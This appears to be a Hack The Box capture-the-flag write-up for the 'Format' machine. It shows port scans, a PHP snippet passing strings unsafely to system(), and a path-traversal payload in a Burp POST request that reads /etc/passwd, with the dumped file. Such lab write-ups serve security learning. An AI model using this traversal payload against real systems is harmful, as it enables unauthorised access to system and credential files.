
`rustscan`

```sh
┌──(bopbap㉿ssa)-[~/Workspace/Hackthebox/Format]
└─$ rustscan -a $IP --ulimit 5000 --range 1-65000 -t 2000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/bopbap/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.213:22
Open 10.10.11.213:80
Open 10.10.11.213:3000
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-25 05:23 EDT
Initiating Ping Scan at 05:23
Scanning 10.10.11.213 [2 ports]
Completed Ping Scan at 05:23, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:23
Completed Parallel DNS resolution of 1 host. at 05:23, 0.06s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 05:23
Scanning 10.10.11.213 [3 ports]
Discovered open port 22/tcp on 10.10.11.213
Discovered open port 80/tcp on 10.10.11.213
Discovered open port 3000/tcp on 10.10.11.213
Completed Connect Scan at 05:23, 0.06s elapsed (3 total ports)
Nmap scan report for 10.10.11.213
Host is up, received conn-refused (0.064s latency).
Scanned at 2023-07-25 05:23:13 EDT for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3000/tcp open  ppp     syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds


┌──(bopbap㉿ssa)-[~/Workspace/Hackthebox/Format]
└─$
```

`nmap`

```sh
┌──(bopbap㉿ssa)-[~/Workspace/Hackthebox/Format]
└─$ nmap -sC -sV -p- $IP -T4 -o nmap_full.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-25 05:24 EDT
Nmap scan report for 10.10.11.213
Host is up (0.059s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c397ce837d255d5dedb545cdf20b054f (RSA)
|   256 b3aa30352b997d20feb6758840a517c1 (ECDSA)
|_  256 fab37d6e1abcd14b68edd6e8976727d7 (ED25519)
80/tcp   open  http    nginx 1.18.0
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0
3000/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://microblog.htb:3000/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.87 seconds
```


```
Gitea Version: 1.17.3 
```


`index.php`
```php
        $tmp_dir = "/tmp/" . generateRandomString(7);
        system("mkdir -m 0700 " . $tmp_dir);
        system("cp -r /var/www/microblog-template/* " . $tmp_dir);
        system("chmod 500 " . $tmp_dir);
        system("chmod +w /var/www/microblog");
        system("cp -rp " . $tmp_dir . " /var/www/microblog/" . $site_name);
		system("chmod -w microblog");
		system ("chmod -R +w " . $tmp_dir);
		system("rm -r " . $tmp_dir);
		header("Location: /dashboard?message=Site added successfully!&status=success");

```


inject `id` parameter with `lfi`
```burp
POST /edit/index.php HTTP/1.1
Host: bopbap.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://bopbap.microblog.htb
Connection: close
Referer: http://bopbap.microblog.htb/edit/?message=Section%20added!&status=success
Cookie: username=i9eo1jvvtdnc2eq6e8mc87j4ab
Upgrade-Insecure-Requests: 1

id=../../../../../etc/passwd&txt=bbb
```


```
root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync

games:x:5:60:games:/usr/games:/usr/sbin/nologin

man:x:6:12:man:/var/cache/man:/usr/sbin/nologin

lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

mail:x:8:8:mail:/var/mail:/usr/sbin/nologin

news:x:9:9:news:/var/spool/news:/usr/sbin/nologin

uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin

proxy:x:13:13:proxy:/bin:/usr/sbin/nologin

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

backup:x:34:34:backup:/var/backups:/usr/sbin/nologin

list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin

irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin

gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin

nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin

systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin

systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin

systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin

cooper:x:1000:1000::/home/cooper:/bin/bash

redis:x:103:33::/var/lib/redis:/usr/sbin/nologin

git:x:104:111:Git Version Control,,,:/home/git:/bin/bash

messagebus:x:105:112::/nonexistent:/usr/sbin/nologin

sshd:x:106:65534::/run/sshd:/usr/sbin/nologin

_laurel:x:997:997::/var/log/laurel:/bin/false
```
